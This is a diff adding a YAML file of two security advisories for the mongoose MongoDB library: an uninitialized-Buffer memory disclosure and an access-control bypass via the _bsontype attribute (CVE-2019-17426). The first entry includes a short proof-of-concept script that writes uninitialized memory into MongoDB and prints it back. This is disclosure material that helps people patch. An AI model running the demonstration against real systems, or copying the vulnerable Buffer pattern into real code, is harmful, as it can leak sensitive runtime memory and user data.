@@ -1,0 +1,71 @@
+---
+- id: snykio:maven:org.webjars.npm:mongoose:480018
+  title: Remote Memory Exposure
+  description: "A potential memory disclosure vulnerability exists in mongoose. A\n`Buffer`
+    field in a MongoDB document can be used to expose sensitive\ninformation such
+    as code, runtime memory and user data into MongoDB.\n\n### Details   {#details}\n\nInitializing
+    a `Buffer` field in a document with integer `N` creates a\n`Buffer` of length
+    `N` with non zero-ed out memory. **Example:**\n\n    var x = new Buffer(100);
+    // uninitialized Buffer of length 100\n    // vs\n    var x = new Buffer('100');
+    // initialized Buffer with value of '100'\n\nInitializing a MongoDB document field
+    in such manner will dump\nuninitialized memory into MongoDB. The patch wraps `Buffer`
+    field\ninitialization in mongoose by converting a `number` value `N` to array\n`[N]`,
+    initializing the `Buffer` with `N` in its binary form.\n\n#### Proof of concept
+    \  {#proof-of-concept}\n\n    var mongoose = require('mongoose');\n    mongoose.connect('mongodb://localhost/bufftest');\n
+    \   \n    // data: Buffer is not uncommon, taken straight from the docs: http://mongoosejs.com/docs/schematypes.html\n
+    \   mongoose.model('Item', new mongoose.Schema({id: String, data: Buffer}));\n
+    \   \n    var Item = mongoose.model('Item');\n    \n    var sample = new Item();\n
+    \   sample.id = 'item1';\n    \n    // This will create an uninitialized buffer
+    of size 100\n    sample.data = 100;\n    sample.save(function () {\n        Item.findOne(function
+    (err, result) {\n            // Print out the data (exposed memory)\n            console.log(result.data.toString('ascii'))\n
+    \           mongoose.connection.db.dropDatabase(); // Clean up everything\n            process.exit();\n
+    \       });\n    });\n{: .language-javascript}\n\n"
+  affected_package: org.webjars.npm:mongoose
+  vulnerable_versions:
+  - ">= 3.5.5 < 3.8.39"
+  - ">= 4.0.0 < 4.3.6"
+  severity: medium
+  package_manager: maven
+  cwe:
+  - CWE-201
+  disclosed_date: 2016-01-23
+  created_date: 2016-01-23
+  last_modified_date: 2016-01-23
+  credit:
+  - ChALkeR
+  references:
+  - https://github.com/Automattic/mongoose/issues/3764
+  - https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md
+  - https://github.com/ChALkeR/notes/blob/master/Lets-fix-Buffer-API.md#previous-materials
+  source_url: https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-480018
+- id: snykio:maven:org.webjars.npm:mongoose:480020
+  title: Information Exposure
+  description: |
+    [org.webjars.npm:mongoose][1] is a Mongoose is a MongoDB object modeling
+    tool designed to work in an asynchronous environment.
+
+    Affected versions of this package are vulnerable to Information
+    Exposure. Any query object with a `_bsontype` attribute is ignored,
+    allowing attackers to bypass access control.
+
+
+
+    [1]: https://www.npmjs.com/package/mongoose
+  affected_package: org.webjars.npm:mongoose
+  vulnerable_versions:
+  - "< 5.7.5"
+  severity: medium
+  package_manager: maven
+  cve:
+  - CVE-2019-17426
+  cwe:
+  - CWE-200
+  disclosed_date: 2019-07-10
+  created_date: 2019-10-10
+  last_modified_date: 2019-10-10
+  credit:
+  - xiaofen9
+  references:
+  - https://github.com/Automattic/mongoose/commit/f3eca5b94d822225c04e96cbeed9f095afb3c31c
+  - https://github.com/Automattic/mongoose/issues/8222
+  source_url: https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-480020
